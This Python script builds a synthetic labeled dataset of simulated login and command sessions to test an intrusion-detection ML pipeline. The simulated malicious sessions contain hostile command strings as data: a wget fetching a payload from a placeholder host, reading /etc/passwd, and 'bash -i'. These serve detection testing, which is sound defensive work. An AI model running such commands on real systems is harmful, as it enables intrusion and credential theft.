"""Build a small labeled development dataset from calculated Module 3 features.

This is NOT real attack ground truth. Labels describe how each synthetic
session was constructed so the ML pipeline can be tested.
"""

from __future__ import annotations

import csv
from datetime import datetime, timedelta, timezone
from pathlib import Path

from ml.models.config import DEFAULT_DEVELOPMENT_DATASET
from ml.preprocessing.feature_extractor import extract_features
from ml.preprocessing.feature_schema import FEATURE_NAMES

BENIGN_COMMANDS = ("ls", "whoami", "pwd", "date", "id")
SUSPICIOUS_COMMANDS = ("wget http://example.invalid/payload", "curl example.invalid", "cat /etc/passwd")


def _event(base: datetime, seconds: int, ip: str, event_type: str, **fields) -> dict:
    payload = {
        "timestamp": (base + timedelta(seconds=seconds)).isoformat(),
        "source_ip": ip,
        "event_type": event_type,
    }
    payload.update(fields)
    return payload


def _normal_session(index: int) -> list[dict]:
    base = datetime(2026, 1, 1, 8, 0, tzinfo=timezone.utc) + timedelta(minutes=index)
    ip = f"10.1.0.{index + 1}"
    success_logins = 1 + (index % 3)
    events = []
    for attempt in range(success_logins):
        events.append(
            _event(base, attempt * (8 + index % 5), ip, "login_attempt", username="alice", success=True)
        )
    command_count = index % 3
    for command_index in range(command_count):
        events.append(
            _event(
                base,
                50 + command_index * (6 + index % 4) + index,
                ip,
                "command",
                username="alice",
                success=True,
                command=BENIGN_COMMANDS[(index + command_index) % len(BENIGN_COMMANDS)],
            )
        )
    return events


def _suspicious_session(index: int) -> list[dict]:
    base = datetime(2026, 1, 1, 12, 0, tzinfo=timezone.utc) + timedelta(minutes=index)
    ip = f"10.2.0.{index + 1}"
    usernames = ["admin", "root", "test"]
    failed = 6 + (index % 11)
    events = []
    for attempt in range(failed):
        events.append(
            _event(
                base,
                attempt * (3 + index % 4) + index,
                ip,
                "login_attempt",
                username=usernames[attempt % (1 + index % 3)],
                success=False,
            )
        )
    if index % 4 == 0:
        events.append(
            _event(base, failed * 5 + index + 3, ip, "login_attempt", username="admin", success=True)
        )
    return events


def _malicious_session(index: int) -> list[dict]:
    base = datetime(2026, 1, 1, 18, 0, tzinfo=timezone.utc) + timedelta(minutes=index)
    ip = f"10.3.0.{index + 1}"
    usernames = ["root", "admin", "ubuntu", "oracle"]
    failed = 16 + (index % 13)
    events = []
    for attempt in range(failed):
        events.append(
            _event(
                base,
                attempt * (2 + index % 3),
                ip,
                "login_attempt",
                username=usernames[attempt % len(usernames)],
                success=False,
            )
        )
    events.append(
        _event(
            base,
            failed * 4 + index + 1,
            ip,
            "command",
            username="root",
            success=True,
            command=SUSPICIOUS_COMMANDS[index % len(SUSPICIOUS_COMMANDS)],
        )
    )
    if index % 2 == 0:
        events.append(
            _event(
                base,
                failed * 4 + index + 8,
                ip,
                "command",
                username="root",
                success=True,
                command="bash -i",
            )
        )
    return events


def build_development_rows(per_class: int = 30) -> list[dict]:
    builders = {
        "normal": _normal_session,
        "suspicious": _suspicious_session,
        "malicious": _malicious_session,
    }
    rows: list[dict] = []
    for label, builder in builders.items():
        for index in range(per_class):
            features = extract_features(builder(index))
            if not features:
                raise RuntimeError(f"Failed to extract features for {label} session {index}")
            row = {name: features[name] for name in FEATURE_NAMES}
            row["label"] = label
            rows.append(row)
    return rows


def write_development_dataset(path: Path | None = None, per_class: int = 30) -> Path:
    output = path or DEFAULT_DEVELOPMENT_DATASET
    output.parent.mkdir(parents=True, exist_ok=True)
    rows = build_development_rows(per_class=per_class)
    with output.open("w", encoding="utf-8", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=[*FEATURE_NAMES, "label"])
        writer.writeheader()
        writer.writerows(rows)
    template = output.with_name("labeled_features.template.csv")
    with template.open("w", encoding="utf-8", newline="") as handle:
        csv.DictWriter(handle, fieldnames=[*FEATURE_NAMES, "label"]).writeheader()
    return output


def main() -> int:
    path = write_development_dataset()
    print(f"Wrote development dataset: {path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
